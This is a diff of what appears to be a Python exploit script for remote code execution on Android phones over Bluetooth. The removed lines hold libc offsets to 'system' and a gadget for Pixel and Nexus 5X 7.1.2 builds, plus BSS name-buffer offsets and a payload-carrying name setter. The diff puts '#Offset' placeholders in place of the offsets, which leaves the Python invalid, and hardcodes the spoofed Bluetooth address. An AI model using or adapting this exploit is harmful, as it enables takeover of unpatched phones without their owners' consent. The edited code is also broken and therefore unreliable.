@@ -26,16 +26,11 @@ STDIN_PORT = 1235
 # bullhead:/ # sha1sum /system/lib/libc.so
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
-# For Pixel 7.1.2 patch level Aug/July 2017
-LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
-LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
+LIBC_TEXT_STSTEM_OFFSET = #Offset
+LIBC_SOME_BLX_OFFSET = #Offset
 
-# For Nexus 5X 7.1.2 patch level Aug/July 2017
-#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
-#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
-
-# Aligned to 4 inside the name on the bss (same for both supported phones)
-BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
+# Aligned to 4 inside the name on the bss
+BSS_ACL_REMOTE_NAME_OFFSET = 0x3c6f1
 BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244
 
 MAX_BT_NAME = 0xf5
@@ -76,12 +71,11 @@ def set_bt_name(payload, src_hci, src, dst):
 
 
 def set_rand_bdaddr(src_hci):
+# Held for redundancy
     addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
-    # NOTW: works only with CSR bluetooth adapters!
-    os.system('sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
-              (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
-    final_addr = ':'.join(addr)
-    log.info('Set %s to new rand BDADDR %s' % (src_hci, final_addr))
+# Input your MAC at "final_addr" as below.
+    final_addr = '00:00:00:00:00:00'
+    log.info('Set %s to BDADDR %s' % (src_hci, final_addr))
     #time.sleep(1)
     while bt.hci_devid(final_addr) < 0:
         time.sleep(0.1)
